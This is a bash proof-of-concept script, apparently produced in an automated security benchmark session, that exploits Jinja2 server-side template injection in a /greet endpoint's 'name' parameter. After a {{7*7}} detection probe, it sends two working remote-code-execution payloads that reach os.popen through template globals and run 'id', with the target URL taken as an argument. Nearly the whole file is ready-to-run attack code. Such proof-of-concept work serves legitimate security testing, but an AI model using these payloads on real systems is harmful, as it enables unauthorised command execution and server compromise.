#!/bin/bash
# POC: Server-Side Template Injection (SSTI) RCE POC with improved URL encoding and diagnostics
# Target: ./repo
# Created: 2025-11-07T21:35:45.568Z
# Session: benchmark-XBEN-076-24-mhpdcdue

# Server-Side Template Injection (SSTI) RCE POC v2
# Target: /greet endpoint with 'name' parameter
# Vulnerability: Jinja2 template injection leading to RCE

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/greet"

echo "[*] SSTI RCE Proof-of-Concept v2"
echo "[*] Target: ${TARGET_URL}${ENDPOINT}"
echo ""

# Check if target is reachable
echo "[*] Checking connectivity to target..."
if ! curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}" 2>/dev/null | grep -q "200\|404\|500"; then
    echo "[!] Target may not be reachable. Attempting alternative approaches..."
fi

# Try a simple request first to verify endpoint works
echo "[*] Attempting basic request..."
BASIC_RESPONSE=$(curl -s "${TARGET_URL}${ENDPOINT}?name=test" 2>&1)
echo "Basic response: $BASIC_RESPONSE"
echo ""

# Test 1: Basic expression evaluation (7*7 = 49)
echo "[TEST 1] Basic Expression Evaluation: {{7*7}}"
PAYLOAD='{{7*7}}'
ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
echo "Encoded payload: $ENCODED_PAYLOAD"
RESPONSE=$(curl -s "${TARGET_URL}${ENDPOINT}?name=${ENCODED_PAYLOAD}" 2>&1)
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "49"; then
    echo "[✓] Expression evaluation confirmed - template injection possible"
    EXIT_CODE=0
else
    echo "[✗] Expression evaluation test (response may be empty if service not running)"
    EXIT_CODE=1
fi
echo ""

# Test 2: Command execution - id command with encoding
echo "[TEST 2] Command Execution: id"
PAYLOAD='{{cycler.__init__.__globals__.os.popen("id").read()}}'
ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
echo "Encoded payload: $ENCODED_PAYLOAD"
RESPONSE=$(curl -s "${TARGET_URL}${ENDPOINT}?name=${ENCODED_PAYLOAD}" 2>&1)
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "uid="; then
    echo "[✓] Command execution confirmed - RCE achieved"
    EXIT_CODE=0
else
    echo "[✗] Command execution test"
fi
echo ""

# Test 3: Alternative RCE payload via request.application
echo "[TEST 3] Alternative RCE Payload: request.application.__globals__"
PAYLOAD='{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}'
ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
echo "Encoded payload (truncated): ${ENCODED_PAYLOAD:0:100}..."
RESPONSE=$(curl -s "${TARGET_URL}${ENDPOINT}?name=${ENCODED_PAYLOAD}" 2>&1)
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "uid="; then
    echo "[✓] Alternative RCE payload successful"
    EXIT_CODE=0
fi
echo ""

echo "[*] SSTI RCE POC v2 Complete"
exit $EXIT_CODE